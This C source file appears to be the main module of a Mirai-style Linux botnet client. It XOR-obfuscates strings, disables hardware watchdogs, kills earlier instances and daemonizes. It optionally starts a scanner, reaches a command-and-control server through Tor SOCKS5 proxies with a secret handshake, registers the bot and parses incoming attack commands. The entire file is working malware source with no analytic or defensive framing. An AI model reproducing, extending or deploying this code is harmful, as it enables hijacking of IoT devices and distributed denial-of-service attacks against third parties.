#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include <sys/socket.h>

#include "rand.h"
#include "command.h"
#include "tor.h"
#include "main.h"
#include "util.h"
#include "syscalls.h"
#include "xor.h"
#include "attacks.h"
#include "scanner.h"

static void main_instance(void);
static int stage = STAGE_SETUP, conn_stage = CONN_SENDSEQ, tor_state = TOR_AUTH, fd_cnc = -1;
static fd_set rdset, wrset;

unsigned int main_checksum(unsigned short int *cksum_arr)
{
    unsigned int i, sum = 0, cksum;

    for (i = 0; i < 12; i++)
        sum = sum + cksum_arr[i];

    cksum = sum >> 16;
    sum = sum & 0x0000FFFF;
    sum = cksum + sum;
    cksum = sum >> 16;
    sum = sum & 0x0000FFFF;
    cksum = cksum + sum;

#ifdef DEBUG
    printf("[main] xored chksum for connecting to cnc 0x%04X\n", (0xFFFF ^ cksum));
#endif

    return cksum;
}

void main_instance_kill(void)
{
    char string[128];
    int fd_file;

    util_memcpy(string, "\x4C\x5F\x66", 3);
    if ((fd_file = open(xor_decode(string, 3), O_RDONLY)) > 0)
    {
        char rdbuf[32];
        int ret = read(fd_file, rdbuf, sizeof(rdbuf));
        if (ret > 0)
        {
            int pid = atoi(rdbuf);
#ifdef DEBUG
            printf("[main] old process running under PID %d\n", pid);
#endif
            if (pid != getpid())
                kill(pid, 9);
        }

        util_memset(rdbuf, 0, sizeof(rdbuf));
        close(fd_file);
        fd_file = 0;
    }
}

void main_instance_logpid(void)
{
    char string[128];
    int fd_file;

    util_memcpy(string, "\x4C\x5F\x66", 3);
    if ((fd_file = open(xor_decode(string, 3), O_CREAT | O_WRONLY | O_TRUNC, 0777)) > 0)
    {
        int pid = getpid();
        char pidstr[32];

        if (pid <= 0)
        {
#ifdef DEBUG
            printf("[main] failed to get our pid\n");
#endif
            exit(0);
        }

        util_itoa(pid, 10, pidstr);
        write(fd_file, pidstr, util_strlen(pidstr));
        close(fd_file);
        fd_file = 0;
    }
}

void main_cleanup_connection(void)
{
    if (fd_cnc != -1)
    {
        syscalls_close(fd_cnc);
        fd_cnc = -1;
    }

    stage = STAGE_SETUP;
    tor_state = TOR_AUTH;
    conn_stage = CONN_SENDSEQ;
    sleep((rand_next() % 5) + 5);
}

int main(int argc, char **argv)
{
    sigset_t sigs;
    int node = 0, fd_watchdog;
    char sendbuf[256], rdbuf[1024], string[128];
    struct timeval tv;

    util_memcpy(string, "\x4D\x0A\x03\x04\x5D\x01\x1F\x16\x01\x16\x62\x7D\x75\x16", 14);
    if ((fd_watchdog = open(xor_decode(string, 14), 2)) != -1)
    {
        int one = 1;
        ioctl(fd_watchdog, 0x80045704, &one);
        close(fd_watchdog);
    }
    util_memset(string, 0, sizeof(string));
    fd_watchdog = -1;

    util_memcpy(string, "\x4D\x0A\x03\x04\x5D\x1B\x17\x11\x01\x51\x71\x73\x66\x75\x66\x86\x8D\x89\xE6", 19);
    if ((fd_watchdog = open(xor_decode(string, 19), 2)) != -1)
    {
        int one = 1;
        ioctl(fd_watchdog, 0x80045704, &one);
        close(fd_watchdog);
    }
    util_memset(string, 0, sizeof(string));
    fd_watchdog = -1;

    main_instance_kill();
    main_instance_logpid();
    rand_init();
    tor_socks_init();

    util_memcpy(string, "\x1A\x1A\x66", 3);

    write(0, xor_decode(string, 3), 3);
    write(0, "\r\n", 2);

    util_memset(string, 0, sizeof(string));
    util_memset(sendbuf, 0, sizeof(sendbuf));
    util_memset(rdbuf, 0, sizeof(rdbuf));

#ifndef DEBUG

    if (syscalls_fork() > 0)
        return 0;

    syscalls_close(0);
    syscalls_close(1);
    syscalls_close(2);

    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
#endif

#ifdef SCANNER
    scanner_init();
    //printf("[scanner] scanner started!\n");
#endif

    while (1)
    {
        if (stage == STAGE_SETUP)
        {
            // connect to host and make it non blocking
            struct sockaddr_in s_addr;
#ifndef IPV4
            node = rand_next() % TOR_MAX_SOCKS;
            util_memset(&s_addr, 0, sizeof(s_addr));
            s_addr.sin_family = AF_INET;
            s_addr.sin_addr.s_addr = tor_retrieve_addr(node);
            s_addr.sin_port = tor_retrieve_port(node);
#else
            node = rand_next() % TOR_MAX_SOCKS;
            util_memset(&s_addr, 0, sizeof(s_addr));
            s_addr.sin_family = AF_INET;
            s_addr.sin_addr.s_addr = INET_ADDR(0,0,0,0);
            s_addr.sin_port = htons(31337);
#endif

            if (fd_cnc != -1)
            {
                syscalls_close(fd_cnc);
                fd_cnc = -1;
            }

            if ((fd_cnc = syscalls_socket(AF_INET, SOCK_STREAM, 0)) == -1)
            {
#ifdef DEBUG
                printf("[main] failed to call socket(), exiting\n");
#endif
                return 0;
            }

            fcntl(fd_cnc, F_SETFL, fcntl(fd_cnc, F_GETFL, 0) | O_NONBLOCK);
            syscalls_connect(fd_cnc, &s_addr, sizeof(struct sockaddr_in));
#ifndef IPV4
            stage = STAGE_VERIFY;
#else
            stage = STAGE_MAINLOOP;
#endif
            continue;
        }
        else if (stage == STAGE_VERIFY)
        {
            int ret;

            FD_ZERO(&rdset);
            FD_ZERO(&wrset);
            FD_CLR(fd_cnc, &wrset);
            FD_CLR(fd_cnc, &rdset);
            FD_SET(fd_cnc, &wrset);

            tv.tv_sec = 10;
            tv.tv_usec = 0;

            ret = select(fd_cnc + 1, NULL, &wrset, NULL, &tv);
            if (ret < 0)
            {
#ifdef DEBUG
                printf("[main] failed to connect to cnc (timeout), retrying\n");
#endif
                main_cleanup_connection();
                continue;
            }

            if (FD_ISSET(fd_cnc, &wrset))
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] failed to connect to cnc (socket error), retrying\n");
#endif
                    main_cleanup_connection();
                    continue;
                }

#ifdef DEBUG
                printf("[main] connection established to tor sock5, attempting authentication\n");
#endif
                util_memcpy(sendbuf, "\x05\x01\x00", 3);
                send(fd_cnc, sendbuf, 3, MSG_NOSIGNAL);
                util_memset(sendbuf, 0, sizeof(sendbuf));
                stage = STAGE_TORSOCK;
                continue;
            }
            else
            {
#ifdef DEBUG
                printf("[main] failed to connect to cnc (cant write), retrying\n");
#endif
                main_cleanup_connection();
                continue;
            }
        }
        else if (stage == STAGE_TORSOCK)
        {
            int complete = 0;

            while (1)
            {
                int ret;

                FD_ZERO(&rdset);
                FD_ZERO(&wrset);
                FD_CLR(fd_cnc, &wrset);
                FD_CLR(fd_cnc, &rdset);

                if (tor_state == TOR_AUTH || tor_state == TOR_VERIFY)
                    FD_SET(fd_cnc, &rdset);
                else if (tor_state == TOR_HANDOVER)
                    FD_SET(fd_cnc, &wrset);
                else
                {
                    complete = 0;
                    break;
                }

                tv.tv_sec = 10;
                tv.tv_usec = 0;

                ret = select(fd_cnc + 1, &rdset, &wrset, NULL, &tv);
                if (ret < 0)
                {
                    complete = 0;
                    break;
                }

                if (FD_ISSET(fd_cnc, &wrset))
                {
                    int err = 0;
                    socklen_t err_len = sizeof(err);

                    getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err != 0)
                    {
                        complete = 0;
                        break;
                    }

                    if (tor_state == TOR_HANDOVER)
                    {
#ifdef DEBUG
                        printf("[main] sending tor sock5 handover, verifying connection\n");
#endif
                        util_memcpy(string, "\x15\x58\x01\x00\x40\x1C\x0F\x18\x51\x1B\x67\x75\x26\x7D\x7D\x8B\xCC\x81\x88\xBB\xBD\xB8\xDE", 23);

                        char len = (char)22;
                        short port = HTONS(CNC_PORT);

                        util_memcpy(sendbuf, "\x05\x01\x00\x03", 4);
                        util_memcpy(sendbuf + 4, &len, 1);
                        util_memcpy(sendbuf + 5, xor_decode(string, 23), len);
                        util_memcpy(sendbuf + 5 + len, &port, 2);

                        send(fd_cnc, sendbuf, 7 + len, MSG_NOSIGNAL);
                        util_memset(string, 0, sizeof(string));
                        util_memset(sendbuf, 0, sizeof(sendbuf));
                        tor_state = TOR_VERIFY;
                        continue;
                    }
                    else
                    {
                        complete = 0;
                        break;
                    }
                }
                else if (FD_ISSET(fd_cnc, &rdset))
                {
                    int err = 0;
                    socklen_t err_len = sizeof(err);

                    getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err != 0)
                    {
                        complete = 0;
                        break;
                    }

                    if (tor_state == TOR_AUTH)
                    {
                        recv(fd_cnc, rdbuf, 2, MSG_NOSIGNAL);

                        if (rdbuf[1] != 0x00)
                        {
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            complete = 0;
                            break;
                        }
#ifdef DEBUG
                        printf("[main] tor sock5 authentication complete\n");
#endif
                        util_memset(rdbuf, 0, sizeof(rdbuf));
                        tor_state = TOR_HANDOVER;
                        continue;
                    }
                    else if (tor_state == TOR_VERIFY)
                    {
                        recv(fd_cnc, rdbuf, 10, MSG_NOSIGNAL);

                        if (rdbuf[1] != 0x00)
                        {
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            complete = 0;
                            break;
                        }

                        util_memset(rdbuf, 0, sizeof(rdbuf));
                        complete = 1;
                        break;
                    }
                    else
                    {
                        complete = 0;
                        break;
                    }
                }
            }

            if (complete == 0)
            {
#ifdef DEBUG
                printf("[main] failed to complete handover with tor sock5\n");
#endif
                main_cleanup_connection();
                continue;
            }
            else
            {
#ifdef DEBUG
                printf("[main] connection verified tor sock5 has been setup\n");
#endif
                tor_state = TOR_AUTH;
                stage = STAGE_MAINLOOP;
                continue;
            }
        }
        else if (stage == STAGE_MAINLOOP)
        {
            while (1)
            {
                int ret;

                FD_ZERO(&rdset);
                FD_ZERO(&wrset);
                FD_CLR(fd_cnc, &wrset);
                FD_CLR(fd_cnc, &rdset);

                if (conn_stage == CONN_SENDSEQ)
                    FD_SET(fd_cnc, &wrset);
                else if (conn_stage == CONN_RECVSEQ || conn_stage == CONN_RECVSEQ2 || conn_stage == CONN_ESTABLISHED)
                    FD_SET(fd_cnc, &rdset);
                else
                    break;

                tv.tv_sec = 10;
                tv.tv_usec = 0;

                ret = select(fd_cnc + 1, &rdset, &wrset, NULL, &tv);
                if (ret < 0)
                {
                    send(fd_cnc, "\x00", 1, MSG_NOSIGNAL);
                    continue;
                }

                if (FD_ISSET(fd_cnc, &wrset))
                {
                    int err = 0;
                    socklen_t err_len = sizeof(err);

                    getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err != 0)
                        break;

                    if (conn_stage == CONN_SENDSEQ)
                    {
                        struct tcp_hdr tcphdr;
                        struct sockaddr_in laddr;
                        socklen_t addr_len;
                        unsigned short int chksum[12];

                        addr_len = sizeof(laddr);
                        getsockname(fd_cnc, (struct sockaddr *)&laddr, &addr_len);

                        tcphdr.src = HTONS(laddr.sin_port); // source port of socket
                        tcphdr.des = CNC_PORT; // dest port to cnc
                        tcphdr.seq = CNC_SECRET; // secret seq number
                        tcphdr.ack = 0;
                        tcphdr.hdr_flags = 0x01;
                        tcphdr.rec = 0;
                        tcphdr.cksum = 0;
                        tcphdr.ptr = 0;
                        tcphdr.opt = 0;

                        util_memcpy(chksum, &tcphdr, 24);
                        tcphdr.cksum = main_checksum(chksum);

                        util_memset(sendbuf, 0, sizeof(sendbuf));
                        util_memcpy(sendbuf, &tcphdr, sizeof(tcphdr));
                        send(fd_cnc, sendbuf, 255, MSG_NOSIGNAL);
                        util_memset(sendbuf, 0, sizeof(sendbuf));
                        util_memset(chksum, 0, sizeof(chksum));
                        util_memset(&tcphdr, 0, sizeof(tcphdr));
                        util_memset(&laddr, 0, sizeof(laddr));
                        conn_stage = CONN_RECVSEQ;
                        continue;
                    }
                    else
                        break;
                }
                else if (FD_ISSET(fd_cnc, &rdset))
                {
                    int err = 0;
                    socklen_t err_len = sizeof(err);

                    getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err != 0)
                        break;

                    if (conn_stage == CONN_RECVSEQ || conn_stage == CONN_RECVSEQ2)
                    {
                        struct tcp_hdr tcphdr;
                        unsigned short int chksum[12];

                        recv(fd_cnc, rdbuf, 255, MSG_NOSIGNAL);
                        util_memcpy(&tcphdr, rdbuf, sizeof(tcphdr));

                        if (conn_stage == CONN_RECVSEQ)
                        {
                            if (tcphdr.ack != 18457 || tcphdr.seq != 28913)
                            {
#ifdef DEBUG
                                printf("[main] invalid seq/ack responce from cnc (%d, %d)\n", tcphdr.ack, tcphdr.seq);
#endif
                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                util_memset(&tcphdr, 0, sizeof(tcphdr));
                                util_memset(chksum, 0, sizeof(chksum));
                                util_memset(sendbuf, 0, sizeof(sendbuf));
                                break;
                            }
#ifdef DEBUG
                            printf("[main] received correct seq/ack responce from cnc (part 1/2)\n");
#endif
                            tcphdr.src = tcphdr.des;
                            tcphdr.des = tcphdr.src;
                            tcphdr.ack = tcphdr.seq + 1;
                            tcphdr.hdr_flags = 0x02;

                            util_memcpy(chksum, &tcphdr, 24);
                            tcphdr.cksum = main_checksum(chksum);

                            util_memset(sendbuf, 0, sizeof(sendbuf));
                            util_memcpy(sendbuf, &tcphdr, sizeof(tcphdr));
                            send(fd_cnc, sendbuf, 255, MSG_NOSIGNAL);
                            util_memset(&tcphdr, 0, sizeof(tcphdr));
                            util_memset(chksum, 0, sizeof(chksum));
                            util_memset(sendbuf, 0, sizeof(sendbuf));
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            conn_stage = CONN_RECVSEQ2;
                            continue;
                        }
                        else if (conn_stage == CONN_RECVSEQ2)
                        {
                            if (tcphdr.ack != 28914 || tcphdr.seq != 10101)
                            {
#ifdef DEBUG
                                printf("[main] invalid seq/ack responce from cnc (%d, %d)\n", tcphdr.ack, tcphdr.seq);
#endif
                                util_memset(&tcphdr, 0, sizeof(tcphdr));
                                util_memset(chksum, 0, sizeof(chksum));
                                util_memset(sendbuf, 0, sizeof(sendbuf));
                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                break;
                            }
#ifdef DEBUG
                            printf("[main] received correct seq/ack responce from cnc (part 2/2)\n[main] finnished handshake with cnc\n");
#endif
                            util_memset(&tcphdr, 0, sizeof(tcphdr));
                            util_memset(chksum, 0, sizeof(chksum));
                            util_memset(sendbuf, 0, sizeof(sendbuf));
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            conn_stage = CONN_ESTABLISHED;
                            continue;
                        }
                        else
                        {
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            break;
                        }
                    }
                    else if (conn_stage == CONN_ESTABLISHED)
                    {
                        struct command attack;
                        int err = 0, i = 0, length = 0;
                        socklen_t err_len = sizeof(err);

                        getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if (err != 0)
                            break;
#ifdef DEBUG
                        printf("[main] reading command from cnc server\n");
#endif
                        int ret = recv(fd_cnc, rdbuf, sizeof(rdbuf), MSG_NOSIGNAL);

                        errno = 0;
                        if (ret == -1)
                        {
                            if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                            {
                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                continue;
                            }
                            else
                            {
                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                break;
                            }
                        }
                        else if (ret == 0)
                        {
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            break;
                        }

                        if (rdbuf[0] == '\x00')
                        {
                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            continue;
                        }
                        else if (rdbuf[0] == '\x01')
                        {
                            char register_buf[128];
                            uint16_t name_len, tor_node = node;

                            if (argc == 2 && util_strlen(argv[1]) < 16)
                            {
                                name_len = util_strlen(argv[1]);
                                util_memcpy(register_buf, "\x01", 1);
                                util_memcpy(register_buf + 1, &name_len, sizeof(uint16_t));
                                util_memcpy(register_buf + 1 + sizeof(uint16_t), &tor_node, sizeof(uint16_t));
                                util_memcpy(register_buf + 1 + (sizeof(uint16_t) * 2), argv[1], name_len);
                                send(fd_cnc, register_buf, 1 + (sizeof(uint16_t) * 2) + name_len, MSG_NOSIGNAL);
                            }
                            else
                            {
                                name_len = 4;
                                util_memcpy(register_buf, "\x01", 1);
                                util_memcpy(register_buf + 1, &name_len, sizeof(uint16_t));
                                util_memcpy(register_buf + 1 + sizeof(uint16_t), &tor_node, sizeof(uint16_t));
                                util_memcpy(register_buf + 1 + (sizeof(uint16_t) * 2), "null", name_len);
                                send(fd_cnc, register_buf, 1 + (sizeof(uint16_t) * 2) + name_len, MSG_NOSIGNAL);
                            }

                            util_memset(rdbuf, 0, sizeof(rdbuf));
                            util_memset(register_buf, 0, sizeof(register_buf));
                            continue;
                        }

                        command_free(&attack);
                        util_memcpy(&attack.bit_shift, rdbuf, sizeof(uint16_t));
                        util_memcpy(&attack.command_id, rdbuf + sizeof(uint16_t), sizeof(uint16_t));
                        util_memcpy(&attack.args_len, rdbuf + (sizeof(uint16_t) * 2), sizeof(uint16_t));
                        command_enc_switch(&attack);
#ifdef DEBUG
                        printf("[main] parsing attack command (%d, %d, %d) (len=%d)\n", attack.bit_shift, attack.command_id, attack.args_len, ret);
#endif
                        for (i = 0; i < attack.args_len; i++)
                        {
                            int ret = command_argument_parse(rdbuf, (sizeof(uint16_t) * 3) + length);
                            if (ret == -1)
                                break;

                            length += ret;
                        }
#ifdef DEBUG
                        printf("[main] finnished reading attack command\n");
#endif
                        attack_init();
                        sleep(5);
                        attack_free();
                        command_free(&attack);
                        util_memset(rdbuf, 0, sizeof(rdbuf));
                        continue;
                    }
                    else
                        break;
                }
                else
                {
#ifdef DEBUG
                    printf("[main] ping\n");
#endif
                    send(fd_cnc, "\x00", 1, MSG_NOSIGNAL);
                    continue;
                }
            }

#ifdef DEBUG
            printf("[main] lost connection to cnc\n");
#endif
            main_cleanup_connection();
            continue;
        }
        else
        {
            main_cleanup_connection();
            continue;
        }
    }

    return 0;
}
